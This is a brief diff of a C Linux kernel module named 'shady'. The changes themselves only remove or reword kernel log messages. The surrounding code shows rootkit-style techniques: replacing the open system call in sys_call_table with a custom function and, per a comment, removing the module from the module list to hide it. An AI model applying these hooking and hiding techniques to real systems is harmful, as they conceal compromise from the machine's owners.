@@ -289,7 +289,6 @@ shady_init_module(void)
   /*replace the default open system call address by the my_open() system call address*/
   old_open = system_call_table_address[__NR_open];
   system_call_table_address[__NR_open] = my_open;
-  printk(KERN_INFO "open replaced by my_open addr\n");
 
   /*=======to hide this module=======*/
   /*delete the module from modules list*/
@@ -308,7 +307,7 @@ shady_exit_module(void)
   shady_cleanup_module(shady_ndevices);
   /*recover the open address in sys_call_table*/
   system_call_table_address[__NR_open] = old_open;
-  printk(KERN_INFO "Recovered old open.\n");
+  printk(KERN_INFO "Recovered address of the old open inside sys_cal_table.\n");
   return;
 }
 
